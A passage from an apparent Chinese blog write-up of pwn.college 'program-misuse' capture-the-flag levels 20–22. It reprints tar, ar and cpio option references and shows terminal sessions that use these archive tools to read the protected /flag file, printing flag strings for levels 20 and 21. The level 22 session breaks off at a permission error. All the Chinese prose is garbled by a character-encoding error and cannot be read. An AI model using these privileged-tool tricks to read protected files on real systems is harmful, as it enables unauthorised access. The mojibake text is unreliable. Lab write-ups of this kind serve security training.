<li><strong>ÂàõÂª∫ÂΩíÊ°£Êñá‰ª∂</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvf</span> archive.tar file1 file2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü <code>file1</code> Âíå <code>file2</code> ÊâìÂåÖÊàê‰∏Ä‰∏™Âêç‰∏∫ <code>archive.tar</code> ÁöÑÂΩíÊ°£Êñá‰ª∂„ÄÇ</p>
<ol start="2">
<li><strong>ÂàõÂª∫Â∏¶Êúâ gzip ÂéãÁº©ÁöÑÂΩíÊ°£Êñá‰ª∂</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvzf</span> archive.tar.gz directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü <code>directory/</code> ÁõÆÂΩïÂèäÂÖ∂‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂ÂíåÂ≠êÁõÆÂΩïÊâìÂåÖÊàê‰∏Ä‰∏™Âêç‰∏∫ <code>archive.tar.gz</code> ÁöÑÂΩíÊ°£Êñá‰ª∂ÔºåÂπ∂‰ΩøÁî® gzip ËøõË°åÂéãÁº©„ÄÇ</p>
<ol start="3">
<li><strong>ÂàõÂª∫Â∏¶Êúâ bzip2 ÂéãÁº©ÁöÑÂΩíÊ°£Êñá‰ª∂</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvjf</span> archive.tar.bz2 directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü <code>directory/</code> ÁõÆÂΩïÂèäÂÖ∂‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂ÂíåÂ≠êÁõÆÂΩïÊâìÂåÖÊàê‰∏Ä‰∏™Âêç‰∏∫ <code>archive.tar.bz2</code> ÁöÑÂΩíÊ°£Êñá‰ª∂ÔºåÂπ∂‰ΩøÁî® bzip2 ËøõË°åÂéãÁº©„ÄÇ</p>
<ol start="4">
<li><strong>ÂàóÂá∫ÂΩíÊ°£Êñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπ</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-tvf</span> archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂàóÂá∫Âêç‰∏∫ <code>archive.tar</code> ÁöÑÂΩíÊ°£Êñá‰ª∂‰∏≠ÁöÑÊâÄÊúâÊñá‰ª∂ÂíåÁõÆÂΩï„ÄÇ</p>
<ol start="5">
<li><strong>Ëß£ÂéãÂΩíÊ°£Êñá‰ª∂</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞ÜÂêç‰∏∫ <code>archive.tar</code> ÁöÑÂΩíÊ°£Êñá‰ª∂Ëß£ÂéãÁº©Âà∞ÂΩìÂâçÁõÆÂΩï„ÄÇ</p>
<ol start="6">
<li><strong>Ëß£ÂéãÂΩíÊ°£Êñá‰ª∂Âà∞ÊåáÂÆöÁõÆÂΩï</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> archive.tar <span class="token parameter variable">-C</span> /path/to/directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞ÜÂêç‰∏∫ <code>archive.tar</code> ÁöÑÂΩíÊ°£Êñá‰ª∂Ëß£ÂéãÁº©Âà∞ÊåáÂÆöÁöÑÁõÆÂΩï <code>/path/to/directory/</code> ‰∏≠„ÄÇ</p>
<p>ÂΩì‰Ω†Âú®‰ΩøÁî® <code>tar</code> ÂëΩ‰ª§Êó∂ÔºåÂèØ‰ª•‰ΩøÁî®Â§ö‰∏™ÈÄâÈ°πÊù•ÊéßÂà∂ÂÖ∂Ë°å‰∏∫„ÄÇ‰ª•‰∏ãÊòØÂØπÂ∏∏Áî®ÈÄâÈ°πÁöÑËß£ÈáäÔºö</p>
<ol>
<li>
<p><code>-c, --create</code>ÔºöÂàõÂª∫ÂΩíÊ°£Êñá‰ª∂„ÄÇËøô‰∏™ÈÄâÈ°πÂëäËØâ <code>tar</code> ÂëΩ‰ª§‰Ω†Ë¶ÅÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÂΩíÊ°£Êñá‰ª∂„ÄÇ</p>
</li>
<li>
<p><code>-v, --verbose</code>ÔºöËØ¶ÁªÜÊ®°Âºè„ÄÇÂêØÁî®ËØ¶ÁªÜËæìÂá∫Ôºå‰ºöÊòæÁ§∫ÂàõÂª∫ÊàñÊèêÂèñÁöÑÊñá‰ª∂ÂàóË°®„ÄÇ</p>
</li>
<li>
<p><code>-f, --file=ARCHIVE</code>ÔºöÊåáÂÆöÂΩíÊ°£Êñá‰ª∂ÁöÑÂêçÁß∞„ÄÇ<code>ARCHIVE</code> ÊòØË¶ÅÂàõÂª∫ÁöÑÂΩíÊ°£Êñá‰ª∂ÁöÑÂêçÁß∞„ÄÇ</p>
</li>
<li>
<p><code>-z, --gzip</code>Ôºö‰ΩøÁî® gzip ÂéãÁº©„ÄÇ‰ΩøÁî® gzip ÂéãÁº©ÂΩíÊ°£Êñá‰ª∂„ÄÇÂè™ÊúâÂú®ÂàõÂª∫ÂΩíÊ°£Êñá‰ª∂Êó∂Êâç‰ºöÁî®Âà∞„ÄÇ</p>
</li>
<li>
<p><code>-j, --bzip2</code>Ôºö‰ΩøÁî® bzip2 ÂéãÁº©„ÄÇ‰ΩøÁî® bzip2 ÂéãÁº©ÂΩíÊ°£Êñá‰ª∂„ÄÇÂè™ÊúâÂú®ÂàõÂª∫ÂΩíÊ°£Êñá‰ª∂Êó∂Êâç‰ºöÁî®Âà∞„ÄÇ</p>
</li>
<li>
<p><code>-t, --list</code>ÔºöÂàóÂá∫ÂΩíÊ°£Êñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπ„ÄÇËøô‰∏™ÈÄâÈ°πÂëäËØâ <code>tar</code> ÂëΩ‰ª§Ë¶ÅÂàóÂá∫ÂΩíÊ°£Êñá‰ª∂‰∏≠ÁöÑÊâÄÊúâÊñá‰ª∂ÂíåÁõÆÂΩï„ÄÇ</p>
</li>
<li>
<p><code>-x, --extract, --get</code>ÔºöÊèêÂèñÂΩíÊ°£Êñá‰ª∂„ÄÇËøô‰∏™ÈÄâÈ°πÂëäËØâ <code>tar</code> ÂëΩ‰ª§‰Ω†Ë¶ÅÊèêÂèñÂΩíÊ°£Êñá‰ª∂‰∏≠ÁöÑÊñá‰ª∂„ÄÇ</p>
</li>
<li>
<p><code>-C, --directory=DIR</code>ÔºöÊåáÂÆöÊèêÂèñÊñá‰ª∂ÁöÑÁõÆÂΩï„ÄÇ<code>DIR</code> ÊòØÊèêÂèñÊñá‰ª∂Êó∂Ë¶ÅÂ≠òÊîæÁöÑÁõÆÊ†áÁõÆÂΩï„ÄÇ</p>
</li>
<li>
<p><code>-O</code> ÈÄâÈ°π„ÄÇËøô‰∏™ÈÄâÈ°πÂëäËØâ <code>tar</code> ÂëΩ‰ª§Â∞ÜËß£ÂéãÁº©ÁöÑÂÜÖÂÆπÂÜôÂÖ•Ê†áÂáÜËæìÂá∫ËÄå‰∏çÊòØÊñá‰ª∂</p>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level20:/challenge$ <span class="token function">tar</span> <span class="token parameter variable">-cvf</span> flag.tar <span class="token string">"/flag"</span>
tar: Removing leading `/' from member names
/flag
hacker@program-misuse~level20:/challenge$ <span class="token function">ls</span>
babysuid_level20  flag.tar
hacker@program-misuse~level20:/challenge$ <span class="token function">tar</span> <span class="token parameter variable">-xOf</span> flag.tar 
pwn.college<span class="token punctuation">&#123;</span>wg9J9bzxSwEV2tNZMG_zYwyiBFA.0lM2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level21ar"><a class="markdownIt-Anchor" href="#level21ar"></a> level21(ar)</h3>
<p><code>ar</code></p>
<h4 id="ËØ≠Ê≥ï"><a class="markdownIt-Anchor" href="#ËØ≠Ê≥ï"></a> ËØ≠Ê≥ï</h4>
<pre class="line-numbers language-none"><code class="language-none">ar[-dmpqrtx][cfosSuvV][a&lt;ÊàêÂëòÊñá‰ª∂&gt;][b&lt;ÊàêÂëòÊñá‰ª∂&gt;][i&lt;ÊàêÂëòÊñá‰ª∂&gt;][Â§áÂ≠òÊñá‰ª∂][ÊàêÂëòÊñá‰ª∂]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="ÂèÇÊï∞"><a class="markdownIt-Anchor" href="#ÂèÇÊï∞"></a> <strong>ÂèÇÊï∞</strong>Ôºö</h5>
<h5 id="ÂøÖË¶ÅÂèÇÊï∞"><a class="markdownIt-Anchor" href="#ÂøÖË¶ÅÂèÇÊï∞"></a> <strong>ÂøÖË¶ÅÂèÇÊï∞</strong>Ôºö</h5>
<ul>
<li>-d „ÄÄÂà†Èô§Â§áÂ≠òÊñá‰ª∂‰∏≠ÁöÑÊàêÂëòÊñá‰ª∂„ÄÇ</li>
<li>-m „ÄÄÂèòÊõ¥ÊàêÂëòÊñá‰ª∂Âú®Â§áÂ≠òÊñá‰ª∂‰∏≠ÁöÑÊ¨°Â∫è„ÄÇ</li>
<li>-p „ÄÄÊòæÁ§∫Â§áÂ≠òÊñá‰ª∂‰∏≠ÁöÑÊàêÂëòÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ</li>
<li>-q „ÄÄÂ∞ÜÊñá‰ª∂ÈôÑÂä†Âú®Â§áÂ≠òÊñá‰ª∂Êú´Á´Ø„ÄÇ</li>
<li>-r „ÄÄÂ∞ÜÊñá‰ª∂ÊèíÂÖ•Â§áÂ≠òÊñá‰ª∂‰∏≠„ÄÇ</li>
<li>-t „ÄÄÊòæÁ§∫Â§áÂ≠òÊñá‰ª∂‰∏≠ÊâÄÂåÖÂê´ÁöÑÊñá‰ª∂„ÄÇ</li>
<li>-x „ÄÄËá™Â§áÂ≠òÊñá‰ª∂‰∏≠ÂèñÂá∫ÊàêÂëòÊñá‰ª∂„ÄÇ</li>
</ul>
<h5 id="ÈÄâÈ°πÂèÇÊï∞"><a class="markdownIt-Anchor" href="#ÈÄâÈ°πÂèÇÊï∞"></a> <strong>ÈÄâÈ°πÂèÇÊï∞</strong>Ôºö</h5>
<ul>
<li>a&lt;ÊàêÂëòÊñá‰ª∂&gt; „ÄÄÂ∞ÜÊñá‰ª∂ÊèíÂÖ•Â§áÂ≠òÊñá‰ª∂‰∏≠ÊåáÂÆöÁöÑÊàêÂëòÊñá‰ª∂‰πãÂêé„ÄÇ</li>
<li>b&lt;ÊàêÂëòÊñá‰ª∂&gt; „ÄÄÂ∞ÜÊñá‰ª∂ÊèíÂÖ•Â§áÂ≠òÊñá‰ª∂‰∏≠ÊåáÂÆöÁöÑÊàêÂëòÊñá‰ª∂‰πãÂâç„ÄÇ</li>
<li>c „ÄÄÂª∫Á´ãÂ§áÂ≠òÊñá‰ª∂„ÄÇ</li>
<li>f „ÄÄ‰∏∫ÈÅøÂÖçËøáÈïøÁöÑÊñá‰ª∂Âêç‰∏çÂÖºÂÆπ‰∫éÂÖ∂‰ªñÁ≥ªÁªüÁöÑarÊåá‰ª§Êåá‰ª§ÔºåÂõ†Ê≠§ÂèØÂà©Áî®Ê≠§ÂèÇÊï∞ÔºåÊà™ÊéâË¶ÅÊîæÂÖ•Â§áÂ≠òÊñá‰ª∂‰∏≠ËøáÈïøÁöÑÊàêÂëòÊñá‰ª∂ÂêçÁß∞„ÄÇ</li>
<li>i&lt;ÊàêÂëòÊñá‰ª∂&gt; „ÄÄÂ∞ÜÊñá‰ª∂ÊèíÂÖ•Â§áÂ≠òÊñá‰ª∂‰∏≠ÊåáÂÆöÁöÑÊàêÂëòÊñá‰ª∂‰πãÂâç„ÄÇ</li>
<li>o „ÄÄ‰øùÁïôÂ§áÂ≠òÊñá‰ª∂‰∏≠Êñá‰ª∂ÁöÑÊó•Êúü„ÄÇ</li>
<li>s „ÄÄËã•Â§áÂ≠òÊñá‰ª∂‰∏≠ÂåÖÂê´‰∫ÜÂØπË±°Ê®°ÂºèÔºåÂèØÂà©Áî®Ê≠§ÂèÇÊï∞Âª∫Á´ãÂ§áÂ≠òÊñá‰ª∂ÁöÑÁ¨¶Âè∑Ë°®„ÄÇ</li>
<li>S „ÄÄ‰∏ç‰∫ßÁîüÁ¨¶Âè∑Ë°®„ÄÇ</li>
<li>u „ÄÄÂè™Â∞ÜÊó•ÊúüËæÉÊñ∞Êñá‰ª∂ÊèíÂÖ•Â§áÂ≠òÊñá‰ª∂‰∏≠„ÄÇ</li>
<li>v „ÄÄÁ®ãÂ∫èÊâßË°åÊó∂ÊòæÁ§∫ËØ¶ÁªÜÁöÑ‰ø°ÊÅØ„ÄÇ</li>
<li>V „ÄÄÊòæÁ§∫ÁâàÊú¨‰ø°ÊÅØ„ÄÇ</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level21:/challenge$ ar <span class="token parameter variable">-r</span> flag.a /flag
ar: creating flag.a
hacker@program-misuse~level21:/challenge$ <span class="token function">ls</span>
babysuid_level21  flag.a
ssh-entrypoint: flag: <span class="token builtin class-name">command</span> not found
hacker@program-misuse~level21:/challenge$ ar xp flag.a
ar: two different operation options specified
hacker@program-misuse~level21:/challenge$ ar p flag.a
pwn.college<span class="token punctuation">&#123;</span>07JfL0D_QNkJfV4u1O8mk-FX5KA.01M2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level22cpio"><a class="markdownIt-Anchor" href="#level22cpio"></a> level22(cpio)</h3>
<p>cpio ÊòØÁî®Êù•Âª∫Á´ãÔºåËøòÂéüÂ§á‰ªΩÊ°£ÁöÑÂ∑•ÂÖ∑Á®ãÂ∫èÔºåÂÆÉÂèØ‰ª•Âä†ÂÖ•ÔºåËß£ÂºÄ cpio Êàñ tar Â§á‰ªΩÊ°£ÂÜÖÁöÑÊñá‰ª∂„ÄÇ</p>
<h4 id="ËØ≠Ê≥ï-2"><a class="markdownIt-Anchor" href="#ËØ≠Ê≥ï-2"></a> ËØ≠Ê≥ï</h4>
<pre class="line-numbers language-none"><code class="language-none">cpio [-0aABckLovV][-C &lt;ËæìÂÖ•&#x2F;ËæìÂá∫Â§ßÂ∞è&gt;][-F &lt;Â§á‰ªΩÊ°£&gt;][-H &lt;Â§á‰ªΩÊ†ºÂºè&gt;][-O &lt;Â§á‰ªΩÊ°£&gt;][--block-size&#x3D;&lt;Âå∫ÂùóÂ§ßÂ∞è&gt;][--force-local][--help][--quiet][--version] Êàñ cpio [-bBcdfikmnrsStuvV][-C &lt;ËæìÂÖ•&#x2F;ËæìÂá∫Â§ßÂ∞è&gt;][-E &lt;ËåÉÊú¨Êñá‰ª∂&gt;][-F &lt;Â§á‰ªΩÊ°£&gt;][-H &lt;Â§á‰ªΩÊ†ºÂºè&gt;][-I &lt;Â§á‰ªΩÊ°£&gt;][-M &lt;Âõû‰º†‰ø°ÊÅØ&gt;][-R &lt;Êã•ÊúâËÄÖ&gt;&lt;:&#x2F;.&gt;&lt;ÊâÄÂ±ûÁæ§ÁªÑ&gt;][--block-size&#x3D;&lt;Âå∫ÂùóÂ§ßÂ∞è&gt;][--force-local][--help][--no-absolute-filenames][--no-preserve-owner][--only-verify-crc][--quiet][--sparse][--version][ËåÉÊú¨Ê†∑Âºè...] Êàñ cpio [-0adkiLmpuvV][-R &lt;Êã•ÊúâËÄÖ&gt;&lt;:&#x2F;.&gt;&lt;ÊâÄÂ±ûÁæ§ÁªÑ&gt;][--help][--no-preserve-owner][--quiet][--sparse][--version][ÁõÆÁöÑÁõÆ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="ÂèÇÊï∞-2"><a class="markdownIt-Anchor" href="#ÂèÇÊï∞-2"></a> <strong>ÂèÇÊï∞</strong>Ôºö</h5>
<ul>
<li>-0Êàñ‚Äìnull „ÄÄÊé•ÂèóÊñ∞Â¢ûÂàóÊéßÂà∂Â≠óÁ¨¶ÔºåÈÄöÂ∏∏ÈÖçÂêàfindÊåá‰ª§ÁöÑ&quot;-print0&quot;ÂèÇÊï∞‰ΩøÁî®„ÄÇ</li>
<li>-aÊàñ‚Äìreset-access-time „ÄÄÈáçÊñ∞ËÆæÁΩÆÊñá‰ª∂ÁöÑÂ≠òÂèñÊó∂Èó¥„ÄÇ</li>
<li>-AÊàñ‚Äìappend „ÄÄÈôÑÂä†Âà∞Â∑≤Â≠òÂú®ÁöÑÂ§á‰ªΩÊ°£‰∏≠Ôºå‰∏îËøô‰∏™Â§á‰ªΩÊ°£ÂøÖÈ°ªÂ≠òÊîæÂú®Á£ÅÁõò‰∏äÔºåËÄå‰∏çËÉΩÊîæÁΩÆ‰∫éÁ£ÅÂ∏¶Êú∫Èáå„ÄÇ</li>
<li>-bÊàñ‚Äìswap „ÄÄÊ≠§ÂèÇÊï∞ÁöÑÊïàÊûúÂíåÂêåÊó∂ÊåáÂÆö&quot;-sS&quot;ÂèÇÊï∞Áõ∏Âêå„ÄÇ</li>
<li>-B „ÄÄÂ∞ÜËæìÂÖ•/ËæìÂá∫ÁöÑÂå∫ÂùóÂ§ßÂ∞èÊîπÊàê5210 Bytes„ÄÇ</li>
<li>-c „ÄÄ‰ΩøÁî®ÊóßASCIIÂ§á‰ªΩÊ†ºÂºè„ÄÇ</li>
<li>-C&lt;Âå∫ÂùóÂ§ßÂ∞è&gt;Êàñ‚Äìio-size=&lt;Âå∫ÂùóÂ§ßÂ∞è&gt; „ÄÄËÆæÁΩÆËæìÂÖ•/ËæìÂá∫ÁöÑÂå∫ÂùóÂ§ßÂ∞èÔºåÂçï‰ΩçÊòØByte„ÄÇ</li>
<li>-dÊàñ‚Äìmake-directories „ÄÄÂ¶ÇÊúâÈúÄË¶Åcpio‰ºöËá™Ë°åÂª∫Á´ãÁõÆÂΩï„ÄÇ</li>
<li>-E&lt;ËåÉÊú¨Êñá‰ª∂&gt;Êàñ‚Äìpattern-file=&lt;ËåÉÊú¨Êñá‰ª∂&gt; „ÄÄÊåáÂÆöËåÉÊú¨Êñá‰ª∂ÔºåÂÖ∂ÂÜÖÂê´Êúâ‰∏Ä‰∏™ÊàñÂ§ö‰∏™ËåÉÊú¨Ê†∑ÂºèÔºåËÆ©cpioËß£ÂºÄÁ¨¶ÂêàËåÉÊú¨Êù°‰ª∂ÁöÑÊñá‰ª∂ÔºåÊ†ºÂºè‰∏∫ÊØèÂàó‰∏Ä‰∏™ËåÉÊú¨Ê†∑Âºè„ÄÇ</li>
<li>-fÊàñ‚Äìnonmatching „ÄÄËÆ©cpioËß£ÂºÄÊâÄÊúâ‰∏çÁ¨¶ÂêàËåÉÊú¨Êù°‰ª∂ÁöÑÊñá‰ª∂„ÄÇ</li>
<li>-F&lt;Â§á‰ªΩÊ°£&gt;Êàñ‚Äìfile=&lt;Â§á‰ªΩÊ°£&gt; „ÄÄÊåáÂÆöÂ§á‰ªΩÊ°£ÁöÑÂêçÁß∞ÔºåÁî®Êù•Âèñ‰ª£Ê†áÂáÜËæìÂÖ•ÊàñËæìÂá∫Ôºå‰πüËÉΩÂÄüÊ≠§ÈÄöËøáÁΩëÁªú‰ΩøÁî®Âè¶‰∏ÄÂè∞‰∏ªÊú∫ÁöÑ‰øùÂ≠òËÆæÂ§áÂ≠òÂèñÂ§á‰ªΩÊ°£„ÄÇ</li>
<li>-H&lt;Â§á‰ªΩÊ†ºÂºè&gt; „ÄÄÊåáÂÆöÂ§á‰ªΩÊó∂Ê¨≤‰ΩøÁî®ÁöÑÊñá‰ª∂Ê†ºÂºè„ÄÇ</li>
<li>-iÊàñ‚Äìextract „ÄÄÊâßË°åcopy-inÊ®°ÂºèÔºåËøòÂéüÂ§á‰ªΩÊ°£„ÄÇ</li>
<li>-l&lt;Â§á‰ªΩÊ°£&gt; „ÄÄÊåáÂÆöÂ§á‰ªΩÊ°£ÁöÑÂêçÁß∞ÔºåÁî®Êù•Âèñ‰ª£Ê†áÂáÜËæìÂÖ•Ôºå‰πüËÉΩÂÄüÊ≠§ÈÄöËøáÁΩëÁªú‰ΩøÁî®Âè¶‰∏ÄÂè∞‰∏ªÊú∫ÁöÑ‰øùÂ≠òËÆæÂ§áËØªÂèñÂ§á‰ªΩÊ°£„ÄÇ</li>
<li>-k „ÄÄÊ≠§ÂèÇÊï∞Â∞ÜÂøΩÁï•‰∏ç‰∫àÂ§ÑÁêÜÔºå‰ªÖË¥üË¥£Ëß£ÂÜ≥cpio‰∏çÂêåÁâàÊú¨Èó¥ÁöÑÂÖºÂÆπÊÄßÈóÆÈ¢ò„ÄÇ</li>
<li>-lÊàñ‚Äìlink „ÄÄ‰ª•Á°¨ËøûÊé•ÁöÑÊñπÂºèÂèñ‰ª£Â§çÂà∂Êñá‰ª∂ÔºåÂèØÂú®copy-passÊ®°Âºè‰∏ãËøêÁî®„ÄÇ</li>
<li>-LÊàñ‚Äìdereference „ÄÄ‰∏çÂª∫Á´ãÁ¨¶Âè∑ËøûÊé•ÔºåÁõ¥Êé•Â§çÂà∂ËØ•ËøûÊé•ÊâÄÊåáÂêëÁöÑÂéüÂßãÊñá‰ª∂„ÄÇ</li>
<li>-mÊàñpreserve-modification-time „ÄÄ‰∏çÂéªÊõ¥Êç¢Êñá‰ª∂ÁöÑÊõ¥ÊîπÊó∂Èó¥„ÄÇ</li>
<li>-M&lt;Âõû‰º†‰ø°ÊÅØ&gt;Êàñ‚Äìmessage=&lt;Âõû‰º†‰ø°ÊÅØ&gt; „ÄÄËÆæÁΩÆÊõ¥Êç¢‰øùÂ≠òÂ™í‰ΩìÁöÑ‰ø°ÊÅØ„ÄÇ</li>
<li>-nÊàñ‚Äìnumeric-uid-gid „ÄÄ‰ΩøÁî®&quot;-tv&quot;ÂèÇÊï∞ÂàóÂá∫Â§á‰ªΩÊ°£ÁöÑÂÜÖÂÆπÊó∂ÔºåËã•ÂÜçÂä†‰∏äÂèÇÊï∞&quot;-n&quot;ÔºåÂàô‰ºö‰ª•Áî®Êà∑ËØÜÂà´Á†ÅÂíåÁæ§ÁªÑËØÜÂà´Á†ÅÊõø‰ª£Êã•ÊúâËÄÖÂíåÁæ§ÁªÑÂêçÁß∞ÂàóÂá∫Êñá‰ª∂Ê∏ÖÂçï„ÄÇ</li>
<li>-oÊàñ‚Äìcreate „ÄÄÊâßË°åcopy-outÊ®°ÂºèÔºåÂª∫Á´ãÂ§á‰ªΩÊ°£„ÄÇ</li>
<li>-O&lt;Â§á‰ªΩÊ°£&gt; „ÄÄÊåáÂÆöÂ§á‰ªΩÊ°£ÁöÑÂêçÁß∞ÔºåÁî®Êù•Âèñ‰ª£Ê†áÂáÜËæìÂá∫Ôºå‰πüËÉΩÂÄüÊ≠§ÈÄöËøáÁΩëÁªú„ÄÄ‰ΩøÁî®Âè¶‰∏ÄÂè∞‰∏ªÊú∫ÁöÑ‰øùÂ≠òËÆæÂ§áÂ≠òÊîæÂ§á‰ªΩÊ°£„ÄÇ</li>
<li>-pÊàñ‚Äìpass-through „ÄÄÊâßË°åcopy-passÊ®°ÂºèÔºåÁï•ËøáÂ§á‰ªΩÊ≠•È™§ÔºåÁõ¥Êé•Â∞ÜÊñá‰ª∂Â§çÂà∂Âà∞ÁõÆÁöÑÁõÆÂΩï„ÄÇ</li>
<li>-rÊàñ‚Äìrename „ÄÄÂΩìÊúâÊñá‰ª∂ÂêçÁß∞ÈúÄË¶ÅÊõ¥Âä®Êó∂ÔºåÈááÁî®‰∫íÂä®Ê®°Âºè„ÄÇ</li>
<li>-R&lt;Êã•ÊúâËÄÖ&gt;&lt;:/.&gt;&lt;ÊâÄÂ±ûÁæ§ÁªÑ&gt;Êàñ</li>
<li>----owner&lt;Êã•ÊúâËÄÖ&gt;&lt;:/.&gt;&lt;ÊâÄÂ±ûÁæ§ÁªÑ&gt; „ÄÄÂú®copy-inÊ®°ÂºèËøòÂéüÂ§á‰ªΩÊ°£ÔºåÊàñcopy-passÊ®°ÂºèÂ§çÂà∂Êñá‰ª∂Êó∂ÔºåÂèØÊåáÂÆöËøô‰∫õÂ§á‰ªΩÔºåÂ§çÂà∂ÁöÑÊñá‰ª∂ÁöÑÊã•ÊúâËÄÖ‰∏éÊâÄÂ±ûÁæ§ÁªÑ„ÄÇ</li>
<li>-sÊàñ‚Äìswap-bytes „ÄÄ‰∫§Êç¢ÊØèÂØπÂ≠óËäÇÁöÑÂÜÖÂÆπ„ÄÇ</li>
<li>-SÊàñ‚Äìswap-halfwords „ÄÄ‰∫§Êç¢ÊØèÂçä‰∏™Â≠óËäÇÁöÑÂÜÖÂÆπ„ÄÇ</li>
<li>-tÊàñ‚Äìlist „ÄÄÂ∞ÜËæìÂÖ•ÁöÑÂÜÖÂÆπÂëàÁé∞Âá∫Êù•„ÄÇ</li>
<li>-uÊàñ‚Äìunconditional „ÄÄÁΩÆÊç¢ÊâÄÊúâÊñá‰ª∂Ôºå‰∏çËÆ∫Êó•ÊúüÊó∂Èó¥ÁöÑÊñ∞Êóß‰∏éÂê¶ÔºåÁöÜ‰∏ç‰∫àËØ¢ÈóÆËÄåÁõ¥Êé•Ë¶ÜÁõñ„ÄÇ</li>
<li>-vÊàñ‚Äìverbose „ÄÄËØ¶ÁªÜÊòæÁ§∫Êåá‰ª§ÁöÑÊâßË°åËøáÁ®ã„ÄÇ</li>
<li>-VÊàñ‚Äìdot „ÄÄÊâßË°åÊåá‰ª§Êó∂ÔºåÂú®ÊØè‰∏™Êñá‰ª∂ÁöÑÊâßË°åÁ®ãÂ∫èÂâçÈù¢Âä†‰∏ä&quot;.&quot;Âè∑</li>
<li>‚Äìblock-size=&lt;Âå∫ÂùóÂ§ßÂ∞è&gt; „ÄÄËÆæÁΩÆËæìÂÖ•/ËæìÂá∫ÁöÑÂå∫ÂùóÂ§ßÂ∞èÔºåÂÅáÂ¶ÇËÆæÁΩÆÊï∞ÂÄº‰∏∫5ÔºåÂàôÂå∫ÂùóÂ§ßÂ∞è‰∏∫2500ÔºåËã•ËÆæÁΩÆÊàê10ÔºåÂàôÂå∫ÂùóÂ§ßÂ∞è‰∏∫5120Ôºå‰æùÊ¨°Á±ªÊé®„ÄÇ</li>
<li>‚Äìforce-local „ÄÄÂº∫Âà∂Â∞ÜÂ§á‰ªΩÊ°£Â≠òÊîæÂú®Êú¨Âú∞‰∏ªÊú∫„ÄÇ</li>
<li>‚Äìhelp „ÄÄÂú®Á∫øÂ∏ÆÂä©„ÄÇ</li>
<li>‚Äìno-absolute-filenames „ÄÄ‰ΩøÁî®Áõ∏ÂØπË∑ØÂæÑÂª∫Á´ãÊñá‰ª∂ÂêçÁß∞„ÄÇ</li>
<li>‚Äìno-preserve-owner „ÄÄ‰∏ç‰øùÁïôÊñá‰ª∂ÁöÑÊã•ÊúâËÄÖÔºåË∞ÅËß£ÂºÄ‰∫ÜÂ§á‰ªΩÊ°£ÔºåÈÇ£‰∫õÊñá‰ª∂Â∞±ÂΩíË∞ÅÊâÄÊúâ„ÄÇ</li>
<li>-only-verify-crc „ÄÄÂΩìÂ§á‰ªΩÊ°£ÈááÁî®CRCÂ§á‰ªΩÊ†ºÂºèÊó∂ÔºåÂèØ‰ΩøÁî®ËøôÈ°πÂèÇÊï∞Ê£ÄÊü•Â§á‰ªΩÊ°£ÂÜÖÁöÑÊØè‰∏™Êñá‰ª∂ÊòØÂê¶Ê≠£Á°ÆÊó†ËØØ„ÄÇ</li>
<li>‚Äìquiet „ÄÄ‰∏çÊòæÁ§∫Â§çÂà∂‰∫ÜÂ§öÂ∞ëÂå∫Âùó„ÄÇ</li>
<li>‚Äìsparse „ÄÄÂÄòËã•‰∏Ä‰∏™Êñá‰ª∂ÂÜÖÂê´Â§ßÈáèÁöÑËøûÁª≠0Â≠óËäÇÔºåÂàôÂ∞ÜÊ≠§Êñá‰ª∂Â≠òÊàêÁ®ÄÁñèÊñá‰ª∂„ÄÇ</li>
<li>‚Äìversion „ÄÄÊòæÁ§∫ÁâàÊú¨‰ø°ÊÅØ„ÄÇ</li>
</ul>
<h4 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> wp</h4>
<p>Ëøô‰∏™È¢òÂæàÊúâÁÇπÈöæÂ∫¶</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ cpio <span class="token parameter variable">-ov</span> <span class="token operator">&lt;</span> flag <span class="token operator">></span>flag.cpio
ssh-entrypoint: flag: Permission denied
